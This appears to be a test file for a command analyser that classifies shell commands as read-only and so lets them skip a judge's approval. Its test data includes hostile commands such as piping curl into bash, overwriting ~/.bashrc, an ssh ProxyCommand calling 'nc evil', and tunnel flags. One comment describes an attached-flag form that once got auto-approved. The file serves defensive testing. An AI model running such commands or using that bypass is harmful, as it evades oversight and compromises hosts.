import { describe, expect, test } from 'bun:test'

import { analyzeCommand, splitSegments } from './command-analysis'

describe('splitSegments', () => {
  test('splits on operators and newlines, respecting quotes', () => {
    expect(splitSegments('kubectl get pods && echo done')).toEqual([
      'kubectl get pods',
      'echo done',
    ])
    expect(splitSegments('a | b | c')).toEqual(['a', 'b', 'c'])
    expect(splitSegments("echo 'a && b'; ls")).toEqual(["echo 'a && b'", 'ls'])
    expect(splitSegments('line1\nline2')).toEqual(['line1', 'line2'])
  })
})

describe('analyzeCommand — read-only fast-path', () => {
  const ro = (c: string) => analyzeCommand(c).readOnly

  test('plain read-only commands', () => {
    expect(ro('kubectl get pods -n staging')).toBe(true)
    expect(ro('ls -la')).toBe(true)
    expect(ro('cat /etc/hosts')).toBe(true)
    expect(ro('aws ec2 describe-instances --region us-east-1')).toBe(true)
    expect(ro('kubectl get pods && kubectl describe pod x')).toBe(true)
    expect(ro('kubectl logs deploy/api | grep ERROR | head')).toBe(true)
    expect(ro('git status')).toBe(true)
    expect(ro('helm list -A')).toBe(true)
  })
  test('writes are not read-only', () => {
    expect(ro('kubectl apply -f x.yaml')).toBe(false)
    expect(ro('kubectl scale deploy/api --replicas=3')).toBe(false)
    expect(ro('aws ec2 create-tags --resources i-123')).toBe(false)
    expect(ro('curl -X POST https://api/x')).toBe(false)
    expect(ro('psql -c "DELETE FROM users"')).toBe(false)
    expect(ro('sed -i s/a/b/ file')).toBe(false)
    // clustered and suffixed spellings still write in place
    expect(ro('sed -ni s/a/b/p file')).toBe(false)
    expect(ro('sed -i.bak s/a/b/ file')).toBe(false)
    // GNU's long form starts with two dashes, escaping single-dash patterns
    expect(ro('sed --in-place s/a/b/ file')).toBe(false)
    expect(ro('sed --in-place=.bak s/a/b/ file')).toBe(false)
    // getopt_long takes any unambiguous abbreviation, and `in-place` is sed's
    // only long option starting with `i` — all of these edit the file (checked
    // against GNU sed 4.9).
    expect(ro('sed --in-pl s/a/b/ file')).toBe(false)
    expect(ro('sed --in s/a/b/ file')).toBe(false)
    expect(ro('sed --i s/a/b/ file')).toBe(false)
    expect(ro('gh api repos/x/y/issues -X POST -f title=z')).toBe(false)
  })
  test('mutating sub-subcommands are NOT read-only (F1)', () => {
    expect(ro('kubectl config set-context foo')).toBe(false)
    expect(ro('kubectl config use-context prod')).toBe(false)
    expect(ro('git branch -D feature')).toBe(false)
    expect(ro('gh workflow run deploy.yml')).toBe(false)
    expect(ro('gh run cancel 123')).toBe(false)
    expect(ro('helm repo add stable https://x')).toBe(false)
    expect(ro('terraform state rm aws_instance.foo')).toBe(false)
    expect(ro('argocd app sync myapp')).toBe(false)
    expect(ro('git remote add origin url')).toBe(false)
  })

  test('source / . execute a script and are NOT read-only (F2)', () => {
    expect(ro('source ./setup.sh')).toBe(false)
    expect(ro('. ./env.sh')).toBe(false)
  })

  test('output redirections are writes, not read-only (F3)', () => {
    expect(ro('echo pwned > ~/.bashrc')).toBe(false)
    expect(ro('printf x >> /etc/hosts')).toBe(false)
    expect(ro('cat a | tee /tmp/out')).toBe(false)
    expect(ro('kubectl get pods > pods.txt')).toBe(false)
    // harmless redirections stay read-only
    expect(ro('kubectl get pods 2>/dev/null')).toBe(true)
    expect(ro('curl -s https://x 2>&1')).toBe(true)
  })

  test('opaque structure is never read-only', () => {
    expect(ro('echo $(rm -rf /tmp/x)')).toBe(false)
    expect(ro('curl -s x | bash')).toBe(false)
    expect(ro('kubectl get pods | python3 -c "import sys"')).toBe(false)
    expect(analyzeCommand('cat <<EOF\nhi\nEOF').opaque).toBe(true)
  })
  test('neutral leaders and VAR= assignments do not defeat read-only', () => {
    expect(ro('cd /tmp && ls')).toBe(true)
    expect(ro('REGION=us-east-1 aws ec2 describe-instances --region $REGION')).toBe(true)
    expect(ro('timeout 5 kubectl get pods')).toBe(true)
  })

  // Remote commands over the tailnet must be judged on what runs on the
  // customer's machine, not on the ssh wrapper around it.
  test('ssh is judged by its remote command', () => {
    expect(ro("ssh deploy@web-01 'df -h'")).toBe(true)
    expect(ro('ssh deploy@100.101.102.103 df -h')).toBe(true)
    expect(ro("ssh -p 2222 deploy@web-01 'systemctl is-active nginx'")).toBe(true)
    expect(ro("ssh deploy@web-01 'uptime && free -m'")).toBe(true)

    expect(ro("ssh deploy@web-01 'systemctl restart nginx'")).toBe(false)
    expect(ro("ssh deploy@web-01 'rm -rf /var/log/old'")).toBe(false)
    expect(ro("ssh deploy@web-01 'echo x > /etc/motd'")).toBe(false)
  })

  test('ssh without a remote command is never read-only', () => {
    expect(ro('ssh deploy@web-01')).toBe(false)
    expect(ro('ssh -t deploy@web-01')).toBe(false)
  })

  test('ssh flags that reshape the connection defeat the fast-path', () => {
    expect(ro("ssh -L 8080:localhost:80 deploy@web-01 'df -h'")).toBe(false)
    expect(ro("ssh -D 1080 deploy@web-01 'df -h'")).toBe(false)
    expect(ro("ssh -o ProxyCommand='nc evil 22' deploy@web-01 'df -h'")).toBe(false)
    expect(ro("ssh -J jump@bastion deploy@web-01 'df -h'")).toBe(false)
    expect(ro("ssh -A deploy@web-01 'df -h'")).toBe(false)
    // An alternate config file can carry a ProxyCommand of its own.
    expect(ro("ssh -F /tmp/config deploy@web-01 'df -h'")).toBe(false)
    expect(ro("ssh -F/tmp/config deploy@web-01 'df -h'")).toBe(false)
  })

  // The value can be attached to the flag, which leaves no word boundary after
  // the flag letter — the shape that slipped past the original regex and had
  // `ssh -D1080 host 'df -h'` auto-approved while opening a SOCKS proxy.
  test('attached-value flag forms cannot sneak past', () => {
    expect(ro("ssh -D1080 deploy@web-01 'df -h'")).toBe(false)
    expect(ro("ssh -L8080:localhost:80 deploy@web-01 'df -h'")).toBe(false)
    expect(ro("ssh -oProxyCommand=nc%20evil%2022 deploy@web-01 'df -h'")).toBe(false)
    expect(ro("ssh -R2222:localhost:22 deploy@web-01 'df -h'")).toBe(false)
  })

  test('an unrecognised flag costs a judge call rather than trust', () => {
    expect(ro("ssh --some-future-flag deploy@web-01 'df -h'")).toBe(false)
  })

  test('safe flags keep the fast-path, attached or separated', () => {
    expect(ro("ssh -p 2222 deploy@web-01 'df -h'")).toBe(true)
    expect(ro("ssh -p2222 deploy@web-01 'df -h'")).toBe(true)
    expect(ro("ssh -q -4 -p 2222 deploy@web-01 'df -h'")).toBe(true)
    expect(ro("ssh -i /tmp/key deploy@web-01 'df -h'")).toBe(true)
  })

  test('host inspection binaries', () => {
    expect(ro('systemctl status nginx')).toBe(true)
    expect(ro('systemctl is-enabled nginx')).toBe(true)
    expect(ro('journalctl -u nginx -n 100')).toBe(true)
    expect(ro('free -m && lsblk')).toBe(true)

    expect(ro('systemctl restart nginx')).toBe(false)
    expect(ro('systemctl daemon-reload')).toBe(false)
    expect(ro('journalctl --vacuum-time=1d')).toBe(false)
  })

  test('nested ssh is never read-only', () => {
    expect(ro("ssh deploy@jump 'ssh deploy@web-01 df -h'")).toBe(false)
  })
})
